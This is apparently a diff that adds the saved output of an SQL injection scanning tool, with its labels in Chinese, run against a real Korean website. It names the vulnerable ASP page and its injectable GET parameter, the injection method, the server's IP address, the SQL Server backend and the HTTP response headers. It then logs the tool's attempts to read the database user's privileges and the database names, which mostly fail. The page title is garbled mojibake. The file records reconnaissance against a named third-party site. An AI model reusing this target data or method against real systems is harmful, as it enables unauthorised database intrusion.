@@ -1,0 +1,32 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kofu1004.com/holyhouse/holyhompy/bd_pt/ptList.asp?subst=photo&Biz=kofu&id=swsr0709
+ ·页面标题：坷浇扁瘤眉狼 扁档规.
+ ·参数:subst=photo&Biz=kofu&id=swsr0709
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:66.232.146.164
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 07:19:45 GMT
+Connection: Keep-Alive
+Content-Length: 6507
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 07:19:45 GMT
+Set-Cookie: ASPSESSIONIDCSARCBBD=BEHMGMJBHFLLAALPMFLLFIPN; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
